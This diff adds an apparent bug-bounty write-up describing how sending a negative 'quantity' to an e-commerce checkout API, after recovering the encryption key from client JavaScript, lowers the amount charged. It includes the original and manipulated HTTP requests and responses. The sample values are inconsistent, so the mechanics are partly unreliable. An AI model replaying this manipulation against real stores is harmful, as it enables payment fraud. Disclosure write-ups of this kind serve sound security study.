@@ -1,0 +1,139 @@
+<h1 id="target-background">Target Background</h1>
+<p>The target is an web application which allows the users to buy prduct/services online like the ecommerce application.</p>
+
+<h2 id="overview">Overview</h2>
+<p>The Target company have disclosed a vulnerability report long back and the attak surface on the report “a hacker was able to manipulate the amount of money should be paid for the product/service in the checkout/order page”. I have tried the same exact steps to check what type of validation has been implemented in the application as fix to that issue.</p>
+
+<h2 id="recon">Recon</h2>
+<ul>
+  <li>Hosted on AWS</li>
+  <li>react application</li>
+  <li>Mobile application also available</li>
+  <li>Application request and response are encrypted</li>
+</ul>
+
+<h2 id="finding-the-enc-key">Finding the Enc key</h2>
+<p>After checking the application traffic i came to know the application is encrypting the JSON payloads in the application request and in order to manipulate or play with the request payload i have to find the encryption and decryption keys to encrypt and decrypt the response.</p>
+
+<p>As usual while going through the JavaScript file i have found the encryption key, type of algorithm used, mode and Initialization vector.</p>
+
+<h2 id="playing-with-fire">Playing with fire</h2>
+<p>I have tried playing with the price parameter in the request but no luck the application validates the amount shoud be paid with the salted Hash that’s been mapped with the purchase order.</p>
+
+<h3 id="actual-request-and-response">Actual Request and Response</h3>
+
+<h3 id="request">Request</h3>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/v1/checkout</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.target.com</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://www.target.com/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">iframe</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">cross-site</span>
+<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
+
+{
+  "saltedhash": "hashcode",
+  "product_id": "121212",
+  "price": "10",
+  "quantity": "10",
+  "address": "ABC city, ABC.",
+  "zipcode": "123456"
+}
+</code></pre></div></div>
+
+<h3 id="response">Response</h3>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Sat, 18 Feb 2023 14:54:03 GMT
+Expires: Sat, 18 Feb 2023 14:54:03 GMT
+Cache-Control: private, max-age=0
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'self'
+X-Xss-Protection: 1; mode=block
+Content-Length: 32
+Server: GSE
+Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+
+{
+  "saltedhash": "hashcode",
+  "product_id": "121212",
+  "price": "10",
+  "quantity": "-10",
+  "amount_to_be_paid": "100",
+  "address": "ABC city, ABC.",
+  "zipcode": "123456"
+}
+</span></code></pre></div></div>
+
+<p>The above shown is the checkout request that was sent to the server to make payments for the purchase order. The dev implemented a additional paramater <code class="language-plaintext highlighter-rouge">saltedhash</code> as the fix for the previos;y exploited price manipulation vulnerability.</p>
+
+<h2 id="bypass">Bypass</h2>
+<p>After a while going through the application flow and requests i decided to check the <code class="language-plaintext highlighter-rouge">checkout</code> request by digging deeper to find something. I notice there is a paramater called <code class="language-plaintext highlighter-rouge">quantity</code> whcih is used to create orders based on the amount of quantity a customer requires. So i changed the value of it in <em>*negative</em>. Now</p>
+
+<h4 id="manipulated-request">Manipulated Request</h4>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/v1/checkout</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.target.com</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://www.target.com/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">iframe</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">cross-site</span>
+<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
+
+{
+  "saltedhash": "hashcode",
+  "product_id": "121212",
+  "price": "10",
+  "quantity": "-5",
+  "address": "ABC city, ABC.",
+  "zipcode": "123456"
+}
+</code></pre></div></div>
+
+<p>After changing the paramater in negative value and sending the rrequest the servver responded with a change in the amount value. The dev haven’t implemented a validation on the quantity paramter which is the variable is a signed integer so the negative values will be accepted and the backend calculation on the money to be paid will be calculated based on the amount per quantity and nummber of quantities in the cart.</p>
+
+<h3 id="response-1">Response</h3>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Sat, 18 Feb 2023 14:54:03 GMT
+Expires: Sat, 18 Feb 2023 14:54:03 GMT
+Cache-Control: private, max-age=0
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'self'
+X-Xss-Protection: 1; mode=block
+Content-Length: 32
+Server: GSE
+Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+
+{
+  "saltedhash": "hashcode",
+  "product_id": "121212",
+  "price": "10",
+  "quantity": "-5",
+  "amount_to_be_paid": "50",
+  "address": "ABC city, ABC.",
+  "zipcode": "123456"
+}
+</span></code></pre></div></div>
+
+<p>Now we can pay less amount of money for the orders we place by changing the quanttity value in negative values.</p>
+
+<p>Thanks for reading!</p>
+
+<p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>
